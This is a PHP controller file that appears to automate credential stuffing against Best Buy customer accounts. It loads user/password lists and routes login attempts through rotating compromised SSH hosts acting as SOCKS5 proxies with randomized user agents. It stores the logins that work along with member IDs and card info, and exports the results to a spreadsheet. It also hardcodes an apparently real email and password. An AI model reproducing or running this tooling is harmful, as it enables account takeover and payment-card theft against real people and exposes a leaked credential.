<?php

/*
 * Copyright 2016 tupt.
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *      http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */

class BestBuyController extends FBToolController {

    protected $table = 'tbl_ssh_thuan';

    function index() {
//        print_r($_SERVER);
    }

    function check() {

        $this->load();
    }

    function update() {
        if (isset($_POST['acc_list'])) {
            $lines = array_filter(preg_split("#\n+#", $_POST['acc_list']));
            $agents = file(PROCESS_PATH . 'scripts/agent.txt');
            foreach ($lines as $line) {
                @list($user, $pass) = explode('|', $line);
                $user = trim($user);
                $pass = trim($pass);
                if ($user && $pass) {
                    $data = compact('user', 'pass');                    
                    $id = db_select_one('tbl_bestbuy_check', 'id', array('user' => $user), true);
                    if ($id) {
                        // update
                        db_update('tbl_bestbuy_check', $data, array('id' => $id));
                    } else {
                        $data['updated'] = time();
                        $data['agent'] = trim($agents[array_rand($agents)]);
                        db_insert('tbl_bestbuy_check', $data);
                    }
                }
            }
//            $this->json($lines);
        }
    }

    function checkuser() {
        if (isset($_GET['user'])) {
            $ret = db_select_one('tbl_bestbuy_check', array('user', 'pass', 'result', 'check', 'success'), array('user' => $_GET['user'], 'check' => 1));

            if ($ret['result'] && $ret['result'][0] == '{' && strlen($ret['result']) > 10) {
                $ret['result'] = json_decode($ret['result'], true);
//                $ret['success'] = true;
            } else {
//                $ret['success'] = false;
            }

            $this->json($ret);
        }
    }

    // rerun
    //update `tbl_bestbuy_check` set processing=0,`check`=0,result ='',success=0 where locate('timeout', result) = 1 or (`check`=1 and result ='')

    function result($action = null) {

        $page = isset($_GET['page']) ? +$_GET['page'] : 1;
        $fields = array('user', 'pass', 'result', 'updated');
        $link = 'bestbuy/result';

        if ($action === 'all') {
            // show all
            $where = array();
            $link .= "/all";
            $fields[] = 'check';
            $fields[] = 'processing';
        } else {
            $where = array('success' => 1);
        }
        $rows_per_page = 10;

        $numrows = db_select_one('tbl_bestbuy_check', 'COUNT(*)', $where, true);

        if (isset($_GET['agent'])) {
            $fields[] = 'agent';
            $link .= '?agent=1';
            $this->assign('agent', true);
        }

        $pager = array(
            'numpages' => ceil($numrows / $rows_per_page),
            'link' => $link,
            'total' => $numrows
        );
        $offset = ($page - 1) * $rows_per_page;



        $list = db_select('tbl_bestbuy_check', $fields, $where, false, "$offset, $rows_per_page", $action === 'all' ? 'id DESC' : 'updated DESC');

        foreach ($list as &$v) {
            if ($v['updated']) {
                $v['updated'] = date('d-m-Y h:i:sA', +$v['updated']);
            }            
        }
        if ($action !== 'all') {
            foreach ($list as &$v) {
                $v['result'] = json_decode($v['result'], true);
                $v['result']['cardInfo'] = nl2br($v['result']['cardInfo']);
            }
        }

        $this->assign(
                'action', $action, 'list', $list, 'PAGING', helper('paging', $pager)
        )->load();
    }

    function update_bestbuy($file, $output) {
        $lines = file(PROCESS_PATH . "scripts/$file.txt");
        $agents = file(PROCESS_PATH . 'scripts/agent.txt');

        foreach ($lines as &$line) {
            @list($user, $pass, $agent) = explode('|', $line);
            $user = trim($user);
            $pass = trim($pass);
            $agent = trim($agents[array_rand($agents)]);
            $line = "$user|$pass|$agent";
        }

        file_put_contents(PROCESS_PATH . "scripts/$output.txt", implode(PHP_EOL, $lines));
    }

    function update_bestbuy_file($file) {
        $lines = file(PROCESS_PATH . "scripts/$file.txt");
        foreach ($lines as &$line) {
            @list($user, $pass, $agent) = explode('|', $line);
            $user = trim($user);
            $pass = trim($pass);
            $agent = trim($agent);

            $data = compact('user', 'pass', 'agent');

            $id = db_select_one('tbl_bestbuy_check', 'id', array('user' => $user), true);
            if ($id) {
                // update
                db_update('tbl_bestbuy_check', $data, array('id' => $id));
            } else {
                db_insert('tbl_bestbuy_check', $data);
            }
        }
    }

    function get_next_ssh($ip_list, &$ind, $timeout = 10000, $port = 1111) {

        while (true) {
            $item = $ip_list[$ind++];
            if ($ind == count($ip_list)) {
                $ind = 0;
            }
            echo "\nChecking ... ";
            print_r($item);
            if ($item) {
                if ($this->change_server($item['ip'], $item['user'], $item['pass'], $port)) {

                    // has run, then next, no need, url can be repeated, because we have checked existed
//                    if (!$this->check_run($item['ip'], $url)) {
//                        continue;
//                    }

                    sleep(0.5);

                    if ($this->check_port($port, $timeout)) {
                        // random information
//                        list($mobile_width, $mobile_height) = explode('|', $viewports[array_rand($viewports)]);
//                        list($width, $height) = explode('|', $desk_viewports[array_rand($desk_viewports)]);
//                        $mobile_agent_str = $mobile_agents[array_rand($mobile_agents)];
//                        $agent_str = $agents[array_rand($agents)];
//                    $url = $urls[array_rand($urls)];

                        echo "This ip " . $item['ip'] . " is okay\n";

                        return true;
                    }
                }
            } else {
                break;
            }
        }

        return false;
    }

    function export() {
        include APP_PATH . 'lib/excel/PHPExcel.php';
        $field_names = ['Username', 'Password', 'Member ID', 'Card Info', 'Agent'];
        $field_keys = ['user', 'pass', 'memberID', 'cardInfo', 'agent'];
        $data = db_select('tbl_bestbuy_check', array('user', 'pass', 'result', 'agent'), array('success' => 1));

        array_walk($data, function (&$v) {
            $ret = json_decode($v['result'], true);
            if (isset($ret['memberID'])) {
                $v['memberID'] = $ret['memberID'];
                $v['cardInfo'] = $ret['cardInfo'];
            } else {
                $v['memberID'] = '';
                $v['cardInfo'] = '';
            }
            unset($v['result']);
        });


        // Instantiate a new PHPExcel object 
        $objPHPExcel = new PHPExcel();
        // Set the active Excel worksheet to sheet 0 
        $sheet = $objPHPExcel->setActiveSheetIndex(0);
        // Initialise the Excel row number 
        $rowCount = 1;

        //start of printing column names as names of MySQL fields  
        $column = 'A';
        foreach ($field_names as $column_name) {
            $sheet->getColumnDimension($column)->setAutoSize(true);
            $sheet->setCellValue($column . $rowCount, $column_name);
            $column++;
        }

        //end of adding column names  
        //start while loop to get data  
        $rowCount++;
        foreach ($data as $row) {
            $column = 'A';
            foreach ($field_keys as $column_key) {
                $sheet->getStyle($column . $rowCount)->getAlignment()->setHorizontal('left');
                $sheet->setCellValue($column . $rowCount, $row[$column_key]);
                $column++;
            }
            $rowCount++;
        }

        // Redirect output to a client’s web browser (Excel5) 
        header('Content-Type: application/vnd.ms-excel');
        header('Content-Disposition: attachment;filename="bestbuy.xls"');
        header('Cache-Control: max-age=0');
        $objWriter = PHPExcel_IOFactory::createWriter($objPHPExcel, 'Excel5');
        $objWriter->save('php://output');
    }

    function spam_bestbuy($port, $start, $stop, $ctr = 10, $remove_ip = 1, $mobile_rate = 3, $timeout = 10000) {

        // get file to run for this instance
//        $ind_file = +$port - 1110;
//        $lines = file(PROCESS_PATH . "scripts/spam_amazon/$ind_file.txt");
        // each instance has a range of ip, then run a file of amazon acc list
        $where = array("id > $start", "id <= $stop");
//        if ($is_american != -1) {
//            $where['is_american'] = $is_american;
//        }
        $ip_list = db_select($this->table, array('ip', 'user', 'pass'), $where, false, 0, 'id ASC');
        shuffle($ip_list);
        // to get ssh by circle
        $ind_list = 0;

//        foreach ($lines as $line) {
        while (true) {

//            $line = array(
//                'user' => 'jjdre@sbcglobal.net',
//                'pass' => 'bowl300',
//                'agent' => 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/52.0.2743.116 Safari/537.36'
//            );

            $line = db_query_one('SELECT `user`,`pass`,`agent`,`id` FROM tbl_bestbuy_check WHERE (`check` = 0 and `processing` = 0) ORDER BY updated LIMIT 1');
            $rerun = false;
            if (!$line) {
                // try with timeout or error result
                $line = db_query_one("SELECT `user`,`pass`,`agent`,`id` FROM tbl_bestbuy_check WHERE locate('timeout', result) = 1 OR (`check`=1 AND result ='') ORDER BY updated LIMIT 1");
//                update `tbl_bestbuy_check` set processing=0,`check`=0,result ='',success=0 where locate('timeout', result) = 1 or (`check`=1 and result ='')
                $rerun = true;
            }

            if ($line) {

                // mark this item as processing
                if ($rerun) {
                    db_excute("update `tbl_bestbuy_check` set processing=1, `check` = 0, result = '', success=0 where id=" . $line['id']);
                } else {
                    db_update('tbl_bestbuy_check', array('processing' => 1), array('id' => $line['id']));
                }

                $user = trim($line['user']);
                $pass = trim($line['pass']);
                $agent = trim($line['agent']);

                // update info
                $agent_str = "--agent='$agent'";
                $login = "--username='$user' --password='$pass'";
                $cookie = ""; // "--cookies-file=" . PROCESS_PATH . "scripts/cookies/$user.txt";
                $script = PROCESS_PATH . 'scripts/bestbuy.js';
//                $jquery = MEDIA_PATH . 'js/jquery-2.2.1.min.js';
                $test = $this->get_next_ssh($ip_list, $ind_list, $timeout, $port);

                // if ok
                if ($test) {

                    $proxy = "--proxy=127.0.0.1:$port --proxy-type=socks5";
//                $proxy = "";
                    // cache images, viewport as desktop
                    $cmd = $this->casper();
                    //$cmd .= " --jquery=$jquery";
                    $cmd .= " --width=1024 --height=800 $script $login $cookie $proxy $agent_str";

//                    $cmd .= " --path=" . PROCESS_PATH . "script/";
//                echo $cmd . "\n";
//            echo "\nPROCESS $user | $pass";

                    $ret = $this->get_json_response($cmd);
                    // if $ret is false, this ssh is not ok, so will check again
//                  print_r($ret);
                    // update as checked, and done processing
                    $updated_data = array('result' => $ret, 'check' => ($ret === false ? 0 : 1), 'processing' => 0);
                    if ($ret && $ret[0] == '{' && strlen($ret) > 10) {
                        $updated_data['success'] = 1;
                    }
                    $updated_data['updated'] = time();
                    db_update('tbl_bestbuy_check', $updated_data, array('id' => $line['id']));
                } else {
                    // not check, just processing
                    db_update('tbl_bestbuy_check', array('check' => 0, 'processing' => 0), array('id' => $line['id']));
                }

                // update processing = 1;
                $this->close_port($port);
            }

            // sleep 1 second
            sleep(1);
        }
    }

    function spam_bestbuy_one() {

        $line = array(
            'user' => 'jjdre@sbcglobal.net',
            'pass' => 'bowl300',
            'agent' => 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/52.0.2743.116 Safari/537.36'
        );


        $user = trim($line['user']);
        $pass = trim($line['pass']);
        $agent = trim($line['agent']);

        // update info
        $agent_str = "--agent='$agent'";
        $login = "--username='$user' --password='$pass'";
        $script = PROCESS_PATH . 'scripts/bestbuy.js';

        $cmd = $this->casper();

        $cmd .= " --width=1024 --height=800 $script $login $agent_str";

        exec($cmd, $ret);
        print_r($ret);
    }

    function bestbuy_update() {
        $ret = db_select('tbl_bestbuy_check', array('id', 'result'));
        foreach ($ret as &$v) {
            if ($v['result'] && $v['result'][0] == '{' && strlen($v['result']) > 10) {
                db_update('tbl_bestbuy_check', array('success' => 1), array('id' => $v['id']));
            }
        }
    }

    function get_json_response($cmd) {

        $ret = array();
        exec($cmd, $ret);

        if ($ret) {

            foreach ($ret as $row) {

                // check exit or maximun step timeout
                $ret_str = strtolower(substr(trim($row), 0, 6));
                // check exit or maximun step timeout, Unsafe javascript ?, Exiting @@                
                if ($ret_str === 'exitin' || $ret_str === 'maximu' || $ret_str === 'unsafe') {
                    return false;
                }

                if ($row[0] == '{') {
                    return $row;
                }
            }

            return $ret[0];
        }

        return $ret[0];
    }

    function reset_process_bestbuy() {
        db_update('tbl_bestbuy_check', array('processing' => 0), array('processing' => 1));
    }

    function prepare_process_bestbuy($instance_number) {
        $data = db_select('tbl_bestbuy_check', array('user', 'pass', 'agent'), array('check' => 0));
        $size = ceil(count($data) / $instance_number);
        $parts = array_chunk($data, $size);

        $ind_file = 0;
        foreach ($parts as $part) {
            $ind_file++;
            $lines = [];
            foreach ($part as $v) {
                $lines[] = $v['user'] . '|' . $v['pass'] . '|' . $v['agent'];
            }
            file_put_contents(PROCESS_PATH . "scripts/spam_bestbuy/$ind_file.txt", implode(PHP_EOL, $lines));
        }
    }

}
